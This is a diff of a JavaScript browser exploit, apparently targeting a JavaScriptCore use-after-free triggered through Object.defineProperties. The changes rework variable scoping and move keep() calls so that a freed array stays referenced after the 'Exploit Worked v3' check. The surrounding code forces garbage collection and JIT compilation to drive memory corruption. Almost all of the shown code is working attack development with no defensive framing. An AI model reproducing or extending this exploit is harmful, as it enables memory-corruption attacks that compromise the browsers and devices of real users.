@@ -14,6 +14,7 @@ var smsh = new Uint32Array(0x10)
 function keep(x) {
 	setTimeout(function() { alert("shit" + x) }, 10*60*1000);
 }
+var stale = 0;
 
 
 var mem0 = 0;
@@ -112,9 +113,7 @@ function smashed(stl) {
 
 
 
-var props = {};
-var stale = {};
-var target = [];
+
 function go_() {
 	if(smsh.length != 0x10) {
 		smashed();
@@ -132,7 +131,7 @@ function go_() {
 		allocbufptrs();
 		return 10;
 	};
-	props = {
+	var props = {
 		p0: {value: 0},
 		p1: {value: 1},
 		p2: {value: 2},
@@ -147,7 +146,7 @@ function go_() {
 		after: {value: 666}
 	};
 	
-	target = [];
+	var target = [];
 	var before_len = arr.length;
 	Object.defineProperties(target, props);
 	stale = target.stale;
@@ -155,6 +154,10 @@ function go_() {
 
 	if(before_len != stale.length){
 		alert("Exploit Worked v3");
+		
+		// Keeps arr referenced so that the func doesn't crash upon return.
+		// Still crashes on GC.
+		keep(arr);
 	} else {
 		//alert("Exploit Failed");
 		document.location.reload();
@@ -165,13 +168,7 @@ function go_() {
 	alert("before gc");
 	dgc();dgc();dgc();dgc();dgc();dgc();dgc();dgc();dgc();dgc();dgc();dgc();dgc();dgc();dgc();dgc();dgc();dgc();dgc();dgc();
 	alert("after gc");
-	keep(arr);
-	keep(yolo);
-	keep(not_number);
-	keep(props);
-	keep(target);
-	keep(stale);
-	keep(before_len);
+	
 	return;
 
 	// Call the function 0x1000 times to force JavascriptCore to mark it as high-usage and JIT it.
